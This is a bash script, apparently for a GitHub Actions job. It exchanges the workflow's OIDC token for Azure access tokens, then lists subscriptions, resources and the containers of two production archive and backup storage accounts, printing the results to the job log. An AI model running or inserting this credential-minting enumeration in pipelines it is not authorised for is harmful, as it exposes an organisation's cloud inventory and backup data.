#!/usr/bin/env bash
set -uo pipefail
TENANT="${AZURE_TENANT_ID}"; CLIENT="${AZURE_CLIENT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
tok() { curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=${CLIENT}" --data-urlencode "scope=$1" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
ARM=$(tok https://management.azure.com/.default)
echo "ARM_LEN=${#ARM}"
echo "== SUBSCRIPTIONS =="
curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions?api-version=2020-01-01" | head -c 900; echo
echo "== RESOURCES =="
curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/${SUB}/resources?api-version=2021-04-01" | head -c 5000; echo
ST=$(tok https://storage.azure.com/.default)
echo "STORAGE_LEN=${#ST}"
echo "== CONTAINERS =="
curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://sttblarchiveprodx3euoz.blob.core.windows.net/?comp=list" | head -c 3000; echo
echo "== CONTAINERS2 =="
curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list" | head -c 2000; echo
